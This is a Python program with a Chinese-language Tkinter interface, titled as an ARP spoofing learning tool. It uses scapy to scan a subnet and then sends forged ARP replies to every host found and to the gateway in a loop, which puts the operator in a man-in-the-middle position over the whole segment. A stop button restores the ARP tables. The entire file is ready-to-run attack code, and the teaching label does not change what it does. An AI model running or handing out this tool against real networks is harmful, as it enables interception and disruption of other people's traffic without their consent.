import tkinter as tk
from tkinter import messagebox
import threading
import time
from datetime import datetime
import scapy.all as scapy
import re


# ---------- 工具函數 ----------
def valid_ip(ip):
    return re.match(r"^(\d{1,3}\.){3}\d{1,3}$", ip)


def scan_hosts(ip_range):
    arp = scapy.ARP(pdst=ip_range)
    ether = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = ether / arp
    answered = scapy.srp(packet, timeout=2, verbose=False)[0]
    hosts = []
    for _, received in answered:
        hosts.append({"ip": received.psrc, "mac": received.hwsrc})
    return hosts


def spoof(target_ip, spoof_ip):
    packet = scapy.ARP(op=2, pdst=target_ip, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def restore(dst_ip, src_ip):
    dst_mac = get_mac(dst_ip)
    src_mac = get_mac(src_ip)
    if dst_mac and src_mac:
        packet = scapy.ARP(op=2, pdst=dst_ip, hwdst=dst_mac, psrc=src_ip, hwsrc=src_mac)
        scapy.send(packet, count=4, verbose=False)


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = broadcast / arp_request
    answered = scapy.srp(packet, timeout=2, verbose=False)[0]
    if answered:
        return answered[0][1].hwsrc
    return None


def log(msg):
    timestamp = datetime.now().strftime("%H:%M:%S")
    text_log.config(state="normal")
    text_log.insert("end", f"[{timestamp}] {msg}\n")
    text_log.see("end")
    text_log.config(state="disabled")


# ---------- 控制區 ----------
running = False
packet_count = 0
targets = []


def start_spoofing():
    global running, packet_count, targets
    ip_range = entry_network.get().strip()
    gateway_ip = entry_gateway.get().strip()

    if "/" not in ip_range or not valid_ip(gateway_ip):
        messagebox.showerror(
            "輸入錯誤",
            "請輸入正確格式：\nIP 網段如 192.168.69.0/24\nGateway IP 如 192.168.69.1",
        )
        return

    log(f"🔍 掃描中：{ip_range}")
    targets = scan_hosts(ip_range)
    log(f"✅ 找到 {len(targets)} 台主機")

    running = True
    packet_count = 0
    entry_network.config(state="disabled")
    entry_gateway.config(state="disabled")

    def loop():
        global packet_count
        log("🚀 開始 ARP Spoofing...")
        while running:
            for target in targets:
                if target["ip"] != gateway_ip:
                    spoof(target["ip"], gateway_ip)
                    spoof(gateway_ip, target["ip"])
                    packet_count += 2
            label_status.config(text=f"📦 已發送封包：{packet_count}")
            progress_var.set(packet_count % 100)
            time.sleep(2)

    threading.Thread(target=loop, daemon=True).start()


def stop_spoofing():
    global running
    running = False
    time.sleep(1)
    log("🛠️ 正在還原 ARP...")
    for target in targets:
        restore(target["ip"], entry_gateway.get())
        restore(entry_gateway.get(), target["ip"])
    entry_network.config(state="normal")
    entry_gateway.config(state="normal")
    log("🛑 Spoofing 停止，ARP 已還原")
    label_status.config(text="✅ 已停止")


# ---------- GUI ----------
app = tk.Tk()
app.title("整段 ARP 欺騙 學習工具")
app.geometry("680x540")
app.configure(bg="#ececec")

frame_input = tk.LabelFrame(app, text="設定輸入", bg="#ececec")
frame_input.pack(pady=20, padx=20, fill="x")

entry_network = tk.Entry(frame_input, font=("Arial", 12))
entry_network.insert(0, "192.168.69.0/24")
entry_network.pack(pady=10, padx=20, fill="x")

entry_gateway = tk.Entry(frame_input, font=("Arial", 12))
entry_gateway.insert(0, "192.168.69.1")
entry_gateway.pack(pady=10, padx=20, fill="x")

frame_buttons = tk.Frame(app, bg="#ececec")
frame_buttons.pack(pady=10)

btn_start = tk.Button(
    frame_buttons,
    text="▶ 開始 ARP Spoofing",
    command=start_spoofing,
    bg="#28a745",
    fg="white",
    font=("Arial", 10, "bold"),
)
btn_start.grid(row=0, column=0, padx=10, pady=5)

btn_stop = tk.Button(
    frame_buttons,
    text="■ 停止並還原",
    command=stop_spoofing,
    bg="#dc3545",
    fg="white",
    font=("Arial", 10, "bold"),
)
btn_stop.grid(row=0, column=1, padx=10, pady=5)

label_status = tk.Label(app, text="狀態：尚未啟動", font=("Arial", 12), bg="#ececec")
label_status.pack(pady=5)

progress_var = tk.IntVar()
progress = tk.Scale(
    app,
    variable=progress_var,
    from_=0,
    to=100,
    orient="horizontal",
    length=500,
    state="disabled",
)
progress.pack(pady=10)

text_log = tk.Text(app, height=12, font=("Consolas", 10))
text_log.pack(padx=20, pady=10, fill="both", expand=True)
text_log.config(state="disabled")

app.mainloop()
